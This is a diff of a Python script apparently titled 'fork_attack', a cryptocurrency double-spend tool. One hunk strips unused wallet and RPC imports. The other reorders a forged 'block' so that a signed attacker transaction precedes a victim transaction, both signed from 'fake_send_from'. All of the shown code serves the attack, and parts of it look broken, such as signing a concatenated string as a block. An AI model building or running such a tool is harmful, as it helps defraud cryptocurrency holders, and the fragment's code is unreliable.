@@ -4,15 +4,6 @@ import requests
 import subprocess
 import cryptos
 import subprocess
-import json
-import litecoin.rpc
-import hashlib
-import uuid
-
-from bitcoinaddress import Wallet
-from litecoinutils.keys import PrivateKey
-from bitcoincli import Bitcoin
-from bs4 import BeautifulSoup
 
 parser = argparse.ArgumentParser(description="How To use fork_attack")
 
@@ -130,7 +121,7 @@ tx_attacker = transaction_util.sign(tx_attacker, 0, fake_send_from)
 tx_victim   = transaction_util.sign(tx_victim, 0, fake_send_from)
 tx_victim   = cryptos.serialize(tx_victim)
 tx_attacker = cryptos.serialize(tx_attacker)
-block = f"{tx_victim}{tx_attacker}"
+block = f"{tx_attacker}{tx_victim}"
 
 block = transaction_util.signall(block, fake_send_from)
 block = cryptos.serialize(block)
